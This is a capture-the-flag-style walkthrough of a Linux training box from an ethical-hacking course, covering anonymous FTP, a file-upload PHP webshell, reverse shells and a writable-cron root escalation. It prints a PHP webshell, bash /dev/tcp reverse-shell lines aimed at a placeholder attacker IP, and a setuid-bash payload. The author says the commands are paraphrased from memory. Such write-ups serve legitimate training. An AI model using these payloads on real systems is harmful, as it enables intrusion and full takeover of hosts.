# Academy

> **Details reconstructed from memory of my own completed walkthrough — exact commands/outputs may be paraphrased.**

**Platform:** TCM Security — Practical Ethical Hacking (PEH) Capstone  
**Difficulty:** Easy–Intermediate  
**Category:** Linux, anonymous FTP, file-upload RCE, cron privilege escalation

![OS](https://img.shields.io/badge/OS-Linux-yellow?style=flat-square&logo=linux)

![Technique](https://img.shields.io/badge/Foothold-File%20Upload%20RCE-orange?style=flat-square)

![Status](https://img.shields.io/badge/Status-Educational-blue?style=flat-square)

---

## Overview

Academy is one of the capstone boxes from TCM Security's **Practical Ethical Hacking** course. It models a small Linux web host built around a student-portal application, with a misconfigured **anonymous FTP** service leaking information on the side. The full chain is a clean, realistic one: use FTP-leaked data to get into the web application, abuse an insecure **file-upload** feature to drop a PHP webshell for a `www-data` foothold, then escalate to root through a **writable cron job**.

It reinforced the whole methodology end to end — enumerate every service, pivot information from one service into another, confirm execution before going loud, and let local enumeration (not assumptions) reveal the privesc.

---

## Reconnaissance

I ran an **nmap** service scan to map the surface:

```bash
nmap -sC -sV -p- -oN academy-full.txt <target-ip>
```

The relevant services:

- **21/tcp** — FTP, with **anonymous login allowed**
- **22/tcp** — OpenSSH
- **80/tcp** — Apache hosting the **student-portal** web application

### Anonymous FTP enumeration

Because `smb-vuln`-style low-hanging fruit was absent, FTP was the first thing I checked:

```bash
ftp <target-ip>
# Name: anonymous   (blank password)
ls -la
get note.txt
```

The anonymous share held a **note / to-do file** that leaked useful context — references to a development account, default/weak credentials, and hints about the web application's layout. That information became the bridge into the web app rather than a dead end.

### Web enumeration

On port 80 I browsed the portal manually and ran content discovery:

```bash
gobuster dir -u http://<target-ip>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```

This mapped the login/registration flow and, importantly, a **profile / file-upload** feature — the kind of functionality that is frequently implemented without proper validation.

---

## Exploitation

### 1. Authenticate to the portal

Using the account context recovered from the FTP note (and/or registering a student account), I logged into the application backend where the upload feature lived.

### 2. Insecure file upload → PHP webshell

The upload (a profile picture / document feature) did not properly validate file type or extension on the server side. I bypassed the client-side restrictions and uploaded a **PHP webshell** instead of an image. Common bypasses I tested:

- Renaming the payload with a double extension (`shell.php.jpg`) or an alternate executable extension (`.phtml`, `.php5`).
- Spoofing the `Content-Type` header to `image/jpeg` while keeping PHP content.
- Prepending valid image magic bytes so a MIME sniff passes while the file still executes as PHP.

A minimal payload to confirm execution:

```php
<?php system($_GET['cmd']); ?>
```

I located the uploaded file under the app's upload directory and confirmed RCE:

```
http://<target-ip>/uploads/shell.php?cmd=id
```

### 3. Upgrade to a reverse shell

With execution confirmed, I caught a reverse shell as **`www-data`**:

```bash
# listener
nc -lvnp 4444
# via the webshell
http://<target-ip>/uploads/shell.php?cmd=bash -c 'bash -i >%26 /dev/tcp/<your-ip>/4444 0>%261'
```

I then stabilised the TTY (`python3 -c 'import pty; pty.spawn("/bin/bash")'`, `export TERM=xterm`, Ctrl-Z + `stty raw -echo; fg`).

---

## Privilege Escalation — writable cron job

From the `www-data` shell I ran structured local enumeration:

```bash
id
sudo -l
cat /etc/crontab
ls -la /etc/cron.*
```

The escalation vector was a **cron job running as root** that executed a script which was **writable by my user** (or located in a world-writable path). Because root periodically ran the script, I appended a payload that gave me elevated access:

```bash
# example: append a reverse shell to the root-run cron script
echo 'bash -i >& /dev/tcp/<your-ip>/9001 0>&1' >> /path/to/cron-script.sh
# or drop a setuid copy of bash
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' >> /path/to/cron-script.sh
```

On the next cron tick the script executed as root and ran my payload. I either caught a root reverse shell or ran `/tmp/rootbash -p` to get a root shell, confirmed with `id` returning `uid=0(root)`.

---

## Proof & Loot

```bash
id                 # uid=0(root)
cat /root/*.txt    # root proof
cat /home/*/*.txt  # user proof
```

---

## Lessons Learned

Academy was a great reminder that **services leak into each other**. The anonymous FTP share on its own looked low-value, but the note it held was exactly what I needed to progress through the web application — classic information pivoting.

Key takeaways:

- **Always test anonymous FTP.** A single leaked note/credential can unlock an otherwise gated web app.
- **File-upload features are a top-tier web foothold.** Client-side checks mean nothing; server-side extension/MIME validation and a non-executable upload directory are the real controls — and this box had neither.
- **Enumerate cron before kernel exploits.** A root cron job calling a user-writable script is a quiet, reliable privesc that needs no CVE. Reading `/etc/crontab` and checking script permissions should be reflexive after any foothold.
- **Stabilise your shell early** so enumeration and privesc are not fighting a broken TTY.

The file-upload foothold connects directly to my broader web-pentest practice, and the cron privesc rounds out a clean, CVE-free chain that mirrors how real misconfigurations stack up on production hosts.
